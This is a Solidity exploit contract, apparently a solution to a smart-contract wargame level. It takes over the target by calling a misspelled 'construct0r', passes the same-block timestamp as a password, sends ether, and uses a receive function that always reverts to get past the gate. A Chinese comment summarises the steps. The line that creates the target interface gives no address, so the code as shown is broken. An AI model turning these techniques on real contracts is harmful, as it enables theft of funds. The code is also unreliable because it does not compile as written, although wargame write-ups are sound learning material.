// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;


interface Instance {

    function enter() external;
    function getAllowance(uint _password) external; 
    function construct0r() external;
    function createTrick() external;
}

contract Attack {
    
    Instance instance = Instance();

    function attack() public payable{

        instance.construct0r();
        instance.createTrick();
        instance.getAllowance(block.timestamp);
        address(instance).call{value: 0.002 ether}('');
        instance.enter();
    }

    receive() payable external {
        revert();
    }
}

/**
 * 首先要合约 然后同一区块创建Trick 再把receive设置为revert
 */